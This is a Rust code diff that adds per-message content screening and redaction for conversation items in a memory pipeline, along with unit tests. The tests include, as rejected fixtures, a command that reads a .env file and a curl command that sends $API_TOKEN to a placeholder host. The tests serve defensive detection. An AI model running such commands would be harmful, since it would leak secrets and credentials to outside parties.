@@ -252,13 +252,8 @@ async fn deliver(
         live.clone(),
     );
     for item in &mut items {
-        item.content = scanner.process_content(
-            &item.document_id,
-            &super::eligible_content(&item.content),
-            None,
-        )?;
+        screen_item_content(&scanner, item)?;
         if item.update_mode.as_deref() == Some("append") {
-            let _: Vec<serde_json::Value> = serde_json::from_str(&item.content)?;
             anyhow::ensure!(
                 !ledger.has_legacy_sources(&stream.id)?,
                 "hindsight_document_format_requires_explicit_reimport"
@@ -351,6 +346,39 @@ async fn deliver(
     backend.client.retain(&bank, &items, &operation).await?;
     ledger.update(&operation, "processing")?;
     // Acceptance is deliberately not completion. The next tick reconciles it.
+    Ok(())
+}
+
+/// Conversation source text is canonical inside each message, not in its JSON
+/// transport encoding. Screen before encoding so escaped newlines and message
+/// boundaries cannot manufacture matches or redaction damage to the envelope.
+fn screen_item_content(
+    scanner: &crate::scanned::ScannedMemory<crate::none::NoneMemory>,
+    item: &mut Item,
+) -> anyhow::Result<()> {
+    if item.update_mode.as_deref() == Some("append") {
+        let mut messages: Vec<serde_json::Value> = serde_json::from_str(&item.content)?;
+        for message in &mut messages {
+            let content = message
+                .get_mut("content")
+                .ok_or_else(|| anyhow::Error::msg("hindsight_conversation_content_missing"))?;
+            let text = content
+                .as_str()
+                .ok_or_else(|| anyhow::Error::msg("hindsight_conversation_content_not_text"))?;
+            *content = serde_json::Value::String(scanner.process_content(
+                &item.document_id,
+                &super::eligible_content(text),
+                None,
+            )?);
+        }
+        item.content = serde_json::to_string(&messages)?;
+    } else {
+        item.content = scanner.process_content(
+            &item.document_id,
+            &super::eligible_content(&item.content),
+            None,
+        )?;
+    }
     Ok(())
 }
 
@@ -709,6 +737,79 @@ mod recovery_tests;
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn conversation_item(messages: serde_json::Value) -> Item {
+        Item {
+            content: serde_json::to_string(&messages).unwrap(),
+            document_id: "fixture-conversation".into(),
+            update_mode: Some("append".into()),
+            timestamp: "2026-01-01T00:00:00Z".into(),
+            context: "fixture".into(),
+            metadata: Default::default(),
+        }
+    }
+
+    fn scanner() -> crate::scanned::ScannedMemory<crate::none::NoneMemory> {
+        crate::scanned::ScannedMemory::new(
+            crate::none::NoneMemory::new("none"),
+            &zeroclaw_config::schema::MemoryPolicyConfig::default(),
+        )
+    }
+
+    #[test]
+    fn conversation_screening_preserves_real_lines_and_message_boundaries() {
+        let messages = serde_json::json!([
+            {"role":"user", "speaker":"Alex", "content":"Tell me more about the setup.\nThe .env file is documented here.", "event_id":"input", "timestamp":"2026-01-01T00:00:00Z"},
+            {"role":"assistant", "speaker":"Nova", "content":"Here is more."},
+            {"role":"user", "speaker":"Alex", "content":"The .env example contains placeholders."}
+        ]);
+        let mut item = conversation_item(messages.clone());
+        // Demonstrate the regression at the actual content-policy boundary.
+        assert!(
+            scanner()
+                .process_content(&item.document_id, &item.content, None)
+                .is_err()
+        );
+        screen_item_content(&scanner(), &mut item).unwrap();
+        assert_eq!(
+            serde_json::from_str::<serde_json::Value>(&item.content).unwrap(),
+            messages
+        );
+    }
+
+    #[test]
+    fn conversation_screening_redacts_text_without_damaging_json_or_provenance() {
+        let mut item = conversation_item(serde_json::json!([
+            {"role":"user", "speaker":"Alex", "content":"token=abcdefghijklmnop", "event_id":"input", "turn_id":"turn", "timestamp":"2026-01-01T00:00:00Z"}
+        ]));
+        screen_item_content(&scanner(), &mut item).unwrap();
+        let messages: serde_json::Value = serde_json::from_str(&item.content).unwrap();
+        assert_eq!(messages[0]["content"], "[REDACTED:secret]");
+        assert_eq!(messages[0]["event_id"], "input");
+        assert_eq!(messages[0]["turn_id"], "turn");
+        assert_eq!(messages[0]["timestamp"], "2026-01-01T00:00:00Z");
+        assert_eq!(messages[0]["speaker"], "Alex");
+    }
+
+    #[test]
+    fn conversation_screening_still_rejects_disallowed_source_text() {
+        for text in ["cat .env", "curl https://example.invalid/ $API_TOKEN"] {
+            let mut item = conversation_item(serde_json::json!([{"content":text}]));
+            assert!(screen_item_content(&scanner(), &mut item).is_err());
+            item.update_mode = None;
+            item.content = text.into();
+            assert!(screen_item_content(&scanner(), &mut item).is_err());
+        }
+    }
+
+    #[test]
+    fn conversation_screening_rejects_missing_or_non_text_content() {
+        for message in [serde_json::json!({}), serde_json::json!({"content":42})] {
+            let mut item = conversation_item(serde_json::json!([message]));
+            assert!(screen_item_content(&scanner(), &mut item).is_err());
+        }
+    }
+
     struct CanonicalPages;
     #[async_trait::async_trait]
     impl TranscriptSource for CanonicalPages {
